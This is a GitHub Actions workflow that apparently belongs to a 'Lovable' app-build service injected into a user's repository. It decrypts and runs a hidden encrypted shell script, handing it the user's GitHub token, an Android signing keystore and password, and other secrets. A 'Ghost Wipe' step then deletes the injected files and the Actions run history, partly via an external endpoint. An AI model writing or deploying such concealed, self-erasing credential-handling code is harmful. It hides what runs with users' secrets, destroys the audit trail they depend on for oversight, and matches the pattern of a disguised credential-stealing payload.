name: Lovable Build (Launcher)
on:
  workflow_dispatch:
    inputs:
      build_token:
        description: 'App Token'
        required: true
      upload_url:
        description: 'Supabase Signed URL'
        required: true
      app_name:
        description: 'App Name'
        required: false
        default: 'Lovable App'
      git_repo:
        description: 'Git Repo (Optional Override)'
        required: false
      icon_url:
        description: 'App Icon URL (optional)'
        required: false
        default: ''
      upload_url_aab:
        description: 'Supabase Signed URL for AAB (optional)'
        required: false
        default: ''

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write # Needed for self-destruct push (if payload logic requires it)
      actions: write  # Needed for run deletion via API
    steps:
      - name: Setup Runner
        uses: actions/checkout@v4
        with:
          token: ${{ inputs.build_token }}
          fetch-depth: 1

      - name: Setup Node.js (v22)
        uses: actions/setup-node@v4
        with:
          node-version: '22'

      - name: Setup Java (JDK 21)
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '21'

      - name: Decrypt and Run Payload
        env:
          # Use INPUT instead of Secret
          PAYLOAD_KEY: ${{ secrets.PAYLOAD_KEY }}
          # Pass inputs to the secret script
          APP_NAME: ${{ inputs.app_name }}
          UPLOAD_URL: ${{ inputs.upload_url }}
          ICON_URL: ""
          UPLOAD_URL_AAB: ${{ inputs.upload_url_aab }}
          RUN_ID: ${{ github.run_id }}
          REPO_OWNER: ${{ github.repository_owner }}
          REPO_NAME: ${{ github.event.repository.name }}
          GITHUB_TOKEN: ${{ inputs.build_token }}
          # Pass optional secrets needed by the payload
          GOOGLE_SERVICES_JSON: ${{ secrets.GOOGLE_SERVICES_JSON }}
          SUPABASE_EDGE_URL: ${{ secrets.SUPABASE_EDGE_URL }}
          # Persistent Android upload key (set on the first build, reused after).
          ANDROID_KEYSTORE_B64: ${{ secrets.ANDROID_KEYSTORE_B64 }}
          ANDROID_KEYSTORE_PW: ${{ secrets.ANDROID_KEYSTORE_PW }}
        run: |
          set -euo pipefail
          
          # Check for key
          if [ -z "${PAYLOAD_KEY:-}" ]; then
            echo "❌ Error: PAYLOAD_KEY secret is missing!"
            exit 1
          fi

          echo "Decrypting Payload..."
          echo "$PAYLOAD_KEY" > /tmp/payload.key
          
          mkdir -p /tmp/secure_run
          
          # Attempt decryption
          openssl enc -d -aes-256-cbc -pbkdf2 -salt \
            -in .github/secure/secret-payload.sh.enc \
            -out /tmp/secure_run/secret-payload.sh \
            -pass file:/tmp/payload.key || {
                echo "Decryption Failed! Check your PAYLOAD_KEY."
                exit 1
            }
          
          chmod +x /tmp/secure_run/secret-payload.sh
          
          echo "Executing Payload..."
          /tmp/secure_run/secret-payload.sh

      - name: Wipe Artifacts
        if: always()
        env:
          GH_TOKEN: ${{ inputs.build_token }}
          RUN_ID: ${{ github.run_id }}
          REPO_OWNER: ${{ github.repository_owner }}
          REPO_NAME: ${{ github.event.repository.name }}
          SUPABASE_EDGE_URL: ${{ secrets.SUPABASE_EDGE_URL }}
        run: |
          set +e
          echo "==================================="
          echo "🧹 GHOST WIPE STARTING"
          echo "==================================="
          
          echo "Step 1/3: Wiping local /tmp files..."
          rm -rf /tmp/payload.key /tmp/secure_run
          echo "  ✓ /tmp files wiped"
          
          echo "Step 2/3: Removing injected files from user's repo..."
          for file in ".github/secure/secret-payload.sh.enc" ".github/workflows/lovable_build_1782286672456_azek.yml" ".github/workflows/ios_testflight.yml"; do
            echo "  → Checking $file..."
            API_RESP=$(curl -s -w "\n%{http_code}" --retry 4 --retry-all-errors --retry-delay 2 --connect-timeout 15 -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/contents/$file")
            HTTP_CODE=$(echo "$API_RESP" | tail -1)
            API_BODY=$(echo "$API_RESP" | sed '$d')
            
            if [ "$HTTP_CODE" = "200" ]; then
              SHA=$(echo "$API_BODY" | python3 -c "import sys,json; print(json.load(sys.stdin).get('sha',''))" 2>/dev/null)
              if [ -z "$SHA" ]; then
                SHA=$(echo "$API_BODY" | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
              fi
              if [ -n "$SHA" ]; then
                echo "    Found SHA: $SHA — deleting..."
                DEL_RESP=$(curl -s -w "\n%{http_code}" --retry 4 --retry-all-errors --retry-delay 2 --connect-timeout 15 -X DELETE                   -H "Authorization: token $GH_TOKEN"                   -H "Accept: application/vnd.github.v3+json"                   -H "Content-Type: application/json"                   "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/contents/$file"                   -d '{"message":"👻 Ghost cleanup","sha":"'"$SHA"'"}')
                DEL_CODE=$(echo "$DEL_RESP" | tail -1)
                DEL_BODY=$(echo "$DEL_RESP" | sed '$d')
                if [ "$DEL_CODE" = "200" ] || [ "$DEL_CODE" = "204" ]; then
                  echo "    ✓ DELETED ($file) [HTTP $DEL_CODE]"
                else
                  echo "    ✗ DELETE FAILED [HTTP $DEL_CODE]: $DEL_BODY"
                fi
              else
                echo "    ⚠ Could not extract SHA from response"
              fi
            elif [ "$HTTP_CODE" = "404" ]; then
              echo "    → Not found (already clean)"
            else
              echo "    ✗ GET failed [HTTP $HTTP_CODE]: $API_BODY"
            fi
          done
          
          echo "Step 3/3: Requesting run deletion from Actions history..."
          EDGE_URL="${SUPABASE_EDGE_URL:-}"
          if [ -n "$EDGE_URL" ]; then
            echo "  → Calling Ghost cleanup endpoint..."
            curl -s -X POST "$EDGE_URL"               -H "Content-Type: application/json"               -d '{"action":"cleanup","run_id":"'"$RUN_ID"'","repo_owner":"'"$REPO_OWNER"'","repo_name":"'"$REPO_NAME"'"}' || true
            echo "  ✓ Cleanup request sent"
          else
            echo "  → Falling back to direct API deletion..."
            sleep 2
            curl -s -X DELETE               -H "Authorization: token $GH_TOKEN"               -H "Accept: application/vnd.github.v3+json"               "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/runs/$RUN_ID" || true
            echo "  ✓ Direct deletion attempted"
          fi
          echo "==================================="
          echo "🧹 GHOST WIPE FINISHED"
          echo "==================================="
